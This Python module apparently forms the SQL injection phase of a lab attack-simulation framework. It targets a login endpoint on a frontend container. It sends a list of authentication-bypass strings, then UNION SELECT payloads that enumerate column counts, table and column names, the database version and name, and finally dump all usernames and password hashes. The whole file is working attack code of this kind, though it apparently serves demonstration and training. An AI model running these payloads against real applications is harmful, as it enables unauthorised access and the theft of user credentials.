#!/usr/bin/env python3
"""
Phase 3: SQL Injection Attacks
Attempts authentication bypass and schema extraction via frontend vulnerability.

MITRE ATT&CK: T1190 — Exploit Public-Facing Application
"""

import logging

from .base_attacker import BaseAttacker

logger = logging.getLogger(__name__)


class SQLInjection(BaseAttacker):
    """Demonstrates SQL injection authentication bypass and UNION-based data extraction."""

    def __init__(self, frontend_url: str = "http://frontend:3000") -> None:
        super().__init__(frontend_url)

    def attempt_bypass(self) -> bool:
        """Phase 3: SQL Injection Attacks — authentication bypass."""
        logger.info("\n[SQL INJECTION] Attempting authentication bypass via frontend...")
        logger.info("Target: %s/login → Backend MySQL database", self.frontend_url)

        base_login = {"username": "admin", "password": "password"}
        payloads = [
            {**base_login, "type": "Normal login attempt"},
            {"username": "admin' OR '1'='1", "password": "anything", "type": "Basic OR bypass"},
            {"username": "admin' OR 1=1 --", "password": "anything", "type": "Comment-based bypass"},
            {"username": "admin' OR 1=1#", "password": "anything", "type": "Hash comment bypass"},
            {"username": "admin' OR 'x'='x", "password": "anything", "type": "String comparison bypass"},
            {"username": "admin' OR 1=1 LIMIT 1 --", "password": "anything", "type": "LIMIT bypass"},
            {"username": "admin' OR '1'='1' AND '1'='1", "password": "anything", "type": "Double condition bypass"},
        ]

        successful_payloads = []

        for i, payload in enumerate(payloads, 1):
            try:
                logger.info("   Testing payload %d: %s (%s)", i, payload["username"], payload["type"])
                logger.info("   Executing SQL injection → %s/login", self.frontend_url)

                response = self.session.post(
                    f"{self.frontend_url}/login",
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )
                logger.info("   Payload %d: Status %s", i, response.status_code)

                if response.status_code == 200:
                    result = response.json()
                    logger.info("   Response: %s", result)

                    if result.get("success"):
                        logger.info("   ✅ SUCCESS: Authentication bypassed with %s!", payload["type"])
                        logger.info("   Token: %s...", str(result.get("token", "No token"))[:50])
                        user_info = result.get("user", "No user info")
                        logger.info("   User: %s", user_info)
                        if isinstance(user_info, dict):
                            for key, value in user_info.items():
                                logger.info("   %s: %s", key, value)
                        successful_payloads.append(payload)
                    else:
                        logger.warning("   ❌ Payload %d: Authentication failed", i)
                        error_info = result.get("error", "No error details")
                        logger.warning("   Error: %s", error_info)
                        if "sql" in error_info.lower() or "mysql" in error_info.lower():
                            logger.warning("   SQL Error detected: %s", error_info)
                else:
                    logger.warning("   ❌ Payload %d: HTTP %s", i, response.status_code)
                    logger.warning("   Response Text: %s", response.text)
            except Exception as e:
                logger.error("   ❌ Payload %d failed: %s", i, e)

        logger.info("\n[DIRECT DATA EXTRACTION] Testing direct UNION SELECT...")
        self.extract_database_schema()

        return len(successful_payloads) > 0

    def extract_database_schema(self) -> None:
        """Attempt to extract database schema via UNION SELECT injection."""
        logger.info("\n[SCHEMA EXTRACTION] Attempting to extract database schema...")

        schema_payloads = [
            {"username": "nobody' UNION SELECT 1,2,3 -- ", "password": "password", "type": "UNION test (3 cols)"},
            {"username": "nobody' UNION SELECT 1,2,3,4 -- ", "password": "password", "type": "UNION test (4 cols)"},
            {"username": "nobody' UNION SELECT 1,2,3,4,5 -- ", "password": "password", "type": "UNION test (5 cols)"},
            {"username": "nobody' UNION SELECT 1,2,3,4,5,6 -- ", "password": "password", "type": "UNION test (6 cols)"},
            {"username": "nobody' UNION SELECT 1,2,3,4,5,6,7 -- ", "password": "password", "type": "UNION test (7 cols)"},
            {"username": "nobody' UNION SELECT 1,2,3,4,5,6,7,8 -- ", "password": "password", "type": "UNION test (8 cols)"},
            {"username": "nobody' UNION SELECT 1,1,1,1,table_name,1 FROM information_schema.tables -- ", "password": "password", "type": "Table names"},
            {"username": "nobody' UNION SELECT 1,1,1,1,1,1,table_name,1 FROM information_schema.tables -- ", "password": "password", "type": "Table names (impossible)"},
            {"username": "nobody' UNION SELECT 1,1,1,1,column_name,1 FROM information_schema.columns -- ", "password": "password", "type": "Column names"},
            {"username": "nobody' UNION SELECT 1,1,1,1,version(),1 -- ", "password": "password", "type": "MySQL version"},
            {"username": "nobody' UNION SELECT 1,1,1,1,database(),1 -- ", "password": "password", "type": "Database name"},
            {"username": "nobody' UNION SELECT username,email,1,1,password,1 FROM users -- ", "password": "password", "type": "User credentials"},
            {"username": "nobody' UNION SELECT 1,1,1,1,(SELECT GROUP_CONCAT(username,':',password SEPARATOR '<br>') FROM users),1 -- ", "password": "password", "type": "All user hashes"},
        ]

        for i, payload in enumerate(schema_payloads, 1):
            try:
                logger.info("-" * 50)
                logger.info("   Testing schema payload %d: %s", i, payload["type"])
                logger.info("   Executing → %s/login", self.frontend_url)

                response = self.session.post(
                    f"{self.frontend_url}/login",
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )

                if response.status_code == 200:
                    result = response.json()
                    logger.info("   Full Response: %s", result)

                    if result.get("success"):
                        logger.info("   ✅ Schema extraction successful: %s", payload["type"])
                        user_data = result.get("user", {})
                        logger.info("   Data Extracted: %s", user_data.get("role", "n/a"))
                    else:
                        error_info = result.get("error", "")
                        logger.warning("   ❌ Schema extraction failed: %s", payload["type"])
                        if error_info:
                            logger.warning("   Error Details: %s", error_info)
                else:
                    logger.warning("   ❌ Schema payload %d: HTTP %s", i, response.status_code)
                    logger.warning("   Response Text: %s", response.text)
            except Exception as e:
                logger.error("   ❌ Schema payload %d failed: %s", i, e)
